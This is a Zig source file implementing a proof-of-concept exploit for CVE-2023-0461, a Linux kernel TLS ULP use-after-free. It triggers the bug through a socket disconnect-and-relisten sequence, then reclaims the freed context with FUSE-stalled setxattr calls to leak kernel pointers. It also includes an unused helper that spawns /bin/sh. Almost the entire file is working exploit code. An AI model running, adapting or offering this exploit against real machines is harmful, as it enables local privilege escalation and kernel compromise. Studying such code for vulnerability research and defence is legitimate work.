const std = @import("std");
const assert = std.debug.assert;
const log = std.log;
const net = std.net;
const os = std.os;
const fs = std.fs;
const errno = os.errno;
const l = os.linux;
const E = l.E;
const mem = std.mem;
const Allocator = mem.Allocator;

const Fuse = @import("fuse.zig");

const SOL = struct {
    pub const TCP = 6;
};

const TLS = struct {
    pub const TX = 1;
    pub const RX = 2;
};

const F = struct {
    pub const SETPIPE_SZ = 1024 + 7;
};

const CipherType = enum(u16) {
    Zero = 0x0,
    AESGCM128 = 51,
};

const Version = enum(u16) {
    Zero = 0x0,
    TLS12 = 0x0303,
    TLS13 = 0x0304,
};

const TLSCryptoInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
};

const AESGCM128 = extern struct {
    info: TLSCryptoInfo,
    iv: [8]u8,
    key: [16]u8,
    salt: [4]u8,
    rec_seq: [8]u8,
};

comptime {
    assert(@sizeOf(AESGCM128) == 40);
}

const TLSProtInfo = extern struct {
    version: Version,
    cipher_type: CipherType,
    prepend_size: u16,
    tag_size: u16,
    overhead_size: u16,
    iv_size: u16,
    salt_size: u16,
    rec_seq_size: u16,
    aad_size: u16,
    tail_size: u16,
};

comptime {
    assert(@sizeOf(TLSProtInfo) == 20);
}

const KernelPtr = usize;

const CipherContext = extern struct {
    iv: KernelPtr,
    rec_seq: KernelPtr,
};

const ListHead = extern struct {
    next: KernelPtr,
    prev: KernelPtr,
};

const CallbackHead = extern struct {
    next: KernelPtr,
    func: KernelPtr,
};

const TLSContext = extern struct {
    prot_info: TLSProtInfo,
    flags_below: u8,
    // tx_conf: u3,
    // rx_conf: u3,
    // zerocopy_sendfile: bool,
    // rx_no_pad: bool,
    hole0: [3]u8,
    push_pending_record: KernelPtr,
    sk_write_space: KernelPtr,
    priv_ctx_tx: KernelPtr,
    priv_ctx_rx: KernelPtr,
    netdev: KernelPtr,
    tx: CipherContext,
    rx: CipherContext,
    partially_sent_record: KernelPtr,
    partially_sent_offset: u16,
    in_tcp_sendpages: u8,
    pending_open_record_frags: u8,
    hole1: [4]u8,
    tx_lock: [32]u8,
    flags: u64,
    sk_proto: KernelPtr,
    sk: KernelPtr,
    sk_destruct: KernelPtr,
    crypto_send_aes_gcm_128: AESGCM128,
    unused_from_send_union: [16]u8,
    crypto_recv_aes_gcm_128: AESGCM128,
    unused_from_recv_union: [16]u8,
    list: ListHead,
    refcount: u32,
    hole2: [4]u8,
    rcu: CallbackHead,
};

comptime {
    assert(@sizeOf(TLSContext) == 328);
}

// Zig std library doesn't consider possiblity of setting iov_base to null
const iovec_const = extern struct {
    iov_base: [*c]const u8,
    iov_len: usize,
};

const allc = std.heap.page_allocator;

pub fn writev(fd: os.fd_t, iov: []const iovec_const) os.WriteError!usize {
    const iov_count = @as(u31, @intCast(iov.len));
    while (true) {
        const rc = l.syscall3(.writev, @as(usize, @bitCast(@as(isize, fd))), @intFromPtr(iov.ptr), iov_count);
        switch (errno(rc)) {
            .SUCCESS => return @as(usize, @intCast(rc)),
            .INTR => continue,
            .INVAL => return error.InvalidArgument,
            .FAULT => unreachable,
            .AGAIN => return error.WouldBlock,
            .BADF => return error.NotOpenForWriting, // Can be a race condition.
            .DESTADDRREQ => unreachable, // `connect` was never called.
            .DQUOT => return error.DiskQuota,
            .FBIG => return error.FileTooBig,
            .IO => return error.InputOutput,
            .NOSPC => return error.NoSpaceLeft,
            .PERM => return error.AccessDenied,
            .PIPE => return error.BrokenPipe,
            .CONNRESET => return error.ConnectionResetByPeer,
            .BUSY => return error.DeviceBusy,
            else => |err| return os.unexpectedErrno(err),
        }
    }
}

pub fn splice(fd_in: l.fd_t, off_in: ?*l.off_t, fd_out: l.fd_t, off_out: ?*l.off_t, len: usize, flags: usize) !usize {
    const rc = l.syscall6(
        .splice,
        @as(usize, @bitCast(@as(isize, fd_in))),
        @intFromPtr(off_in),
        @as(usize, @bitCast(@as(isize, fd_out))),
        @intFromPtr(off_out),
        len,
        flags,
    );

    switch (errno(rc)) {
        .SUCCESS => return @as(usize, @intCast(rc)),
        else => |err| return os.unexpectedErrno(err),
    }
}

fn retry_connect(sock: os.socket_t, sock_addr: *const os.sockaddr, len: os.socklen_t) !void {
    var n: u8 = 100;
    var last_err: os.ConnectError = undefined;

    while (n > 0) : (n -= 1) {
        os.connect(sock, sock_addr, len) catch |err| {
            last_err = err;
            os.nanosleep(0, 100000);

            continue;
        };

        return;
    }

    return last_err;
}

const Direction = enum(u32) {
    TX = TLS.TX,
    RX = TLS.RX,
};

fn setTLSOpt(sk: os.socket_t, dir: Direction) !void {
    const crypto = AESGCM128{
        .info = .{
            .version = .TLS13,
            .cipher_type = .AESGCM128,
        },
        .iv = .{ 'i', 'v' } ** 4,
        .key = .{ 'k', 'y' } ** 8,
        .salt = .{ 's', 'a', 'l', 't' },
        .rec_seq = .{ 'r', 's' } ** 4,
    };

    try os.setsockopt(sk, l.SOL.TLS, @intFromEnum(dir), mem.asBytes(&crypto));
}

const SyncPipe = struct {
    const Self = @This();

    pipe: [2]os.fd_t,

    pub fn init() !Self {
        return .{
            .pipe = try os.pipe(),
        };
    }

    pub fn deinit(self: Self) void {
        os.close(self.pipe[0]);
        os.close(self.pipe[1]);
    }

    pub fn wait(self: Self, on: u8) !void {
        var buf = [_]u8{0x00};
        _ = try os.read(self.pipe[0], &buf);

        if (buf[0] != on) {
            log.err("desync: {} != {}", .{ buf[0], on });
            return error.desync;
        }
    }

    pub fn cont(self: Self, on: u8) !void {
        _ = try os.write(self.pipe[1], &.{on});
    }

    pub fn retry(self: Self, on: u8) !bool {
        var buf = [_]u8{0x00};
        _ = try os.read(self.pipe[0], &buf);

        if (buf[0] == 0)
            return true;

        if (buf[0] != on) {
            log.err("desync: {} != {}", .{ buf[0], on });
            return error.desync;
        }

        return false;
    }
};

fn sh() !void {
    var child = std.process.Child.init(&[_][]const u8{"/bin/sh"}, allc);

    _ = try child.spawnAndWait();
}

fn cve_2023_0461() !void {
    const server_addr = try net.Ip4Address.parse("127.0.0.1", 0xf00b);
    const server_addr_p: *const l.sockaddr = @ptrCast(&server_addr.sa);
    const target_addr = try net.Ip4Address.parse("127.0.0.1", 0xdead);
    const target_addr_p: *const l.sockaddr = @ptrCast(&target_addr.sa);
    const unspec_addr = l.sockaddr{ .family = l.AF.UNSPEC, .data = undefined };
    const addr_sz = @sizeOf(@TypeOf(server_addr.sa));

    var env = try std.process.getEnvMap(allc);
    defer env.deinit();
    var fuse_dir = try Fuse.mkTmpDir("fuse-cve-2023-0461", env);
    defer fuse_dir.close();
    var fuse = try Fuse.init(fuse_dir);
    defer fuse.deinit();
    const ops = Fuse.Ops{};

    const psync = try SyncPipe.init();
    defer psync.deinit();
    const csync = try SyncPipe.init();
    defer csync.deinit();

    const target_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
    defer os.closeSocket(target_sk);

    const child_pid = try os.fork();

    if (child_pid == 0) {
        log.info("child: listen for first connection", .{});
        const server_sk = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(server_sk);

        try os.bind(server_sk, server_addr_p, addr_sz);
        try os.listen(server_sk, 1);
        try psync.cont(0);

        const client_sk0 = try os.accept(server_sk, null, null, 0);

        log.info("child: warmup the crypto components", .{});
        try os.setsockopt(client_sk0, SOL.TCP, l.TCP.ULP, "tls");
        try setTLSOpt(client_sk0, .RX);
        defer os.closeSocket(client_sk0);
        try psync.cont(1);

        log.info("child: connect for second connection", .{});
        const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
        defer os.closeSocket(client_sk1);
        try csync.wait(2);
        try retry_connect(client_sk1, target_addr_p, addr_sz);

        log.info("child: wait for parent to enter setxattr", .{});
        var got = false;

        while (!got) {
            var req = try fuse.start_read_req();
            try fuse.do_one(ops); //GETATTR
            try fuse.do_one(ops); //LOOKUP

            log.info("child: try overwrite xattr", .{});
            setTLSOpt(target_sk, .RX) catch |e| {
                log.err("child: setTLSOpt failed: {}", .{e});
            };

            log.info("child: read victim data", .{});

            req = try fuse.start_read_req();

            switch (req.body) {
                .setxattr => |xattr| {
                    log.info("child: read {s}: {}: {s}", .{
                        xattr.name,
                        xattr.value.len,
                        std.fmt.fmtSliceEscapeLower(xattr.value),
                    });
                    const ctx: TLSContext = mem.bytesAsValue(TLSContext, xattr.value[0..328]);
                    log.info("child: read: {}", .{ctx});

                    got = ctx.crypto_recv_aes_gcm_128.iv[0] == 'i';
                },
                else => unreachable,
            }

            fuse.done_read_req(req);

            try fuse.do_one(ops); // SETATTR
        }

        try psync.cont(4);

        return;
    }

    defer _ = os.waitpid(child_pid, 0);
    log.info("parent: connect for first connection", .{});

    try psync.wait(0);
    try retry_connect(target_sk, server_addr_p, addr_sz);
    try os.setsockopt(target_sk, SOL.TCP, l.TCP.ULP, "tls");

    try psync.wait(1);
    log.info("parent: disconnect", .{});
    try os.connect(target_sk, &unspec_addr, @sizeOf(@TypeOf(unspec_addr)));
    try os.bind(target_sk, target_addr_p, addr_sz);

    log.info("parent: listen for second connection", .{});

    try os.listen(target_sk, 1);
    try csync.cont(2);

    const client_sk = try os.accept(target_sk, null, null, 0);
    log.info("parent: free the context", .{});
    os.closeSocket(client_sk);

    const tls_sw_ctx_rx: [512]u8 = .{0x00} ** 512;

    log.info("parent: wait for deferred free", .{});

    const name: [:0]const u8 = "user.bar";
    var tmp_dir = try Fuse.getTmpDir(env);
    defer tmp_dir.close();
    const xattr_path: [:0]const u8 = "/tmp/fuse-cve-2023-0461/foo";

    os.nanosleep(5, 0);

    while (psync.retry(4)) {
        const res = Fuse.setxattr(@ptrCast(xattr_path), name, &tls_sw_ctx_rx, tls_sw_ctx_rx.len, 0);
        const err = os.errno(res);
        log.info("parent: setxattr: {s}: {s}: {}", .{ xattr_path, name, err });
    }

    try psync.wait(5);

    log.info("Goodbye!", .{});
}

pub fn main() !void {
    try cve_2023_0461();
}
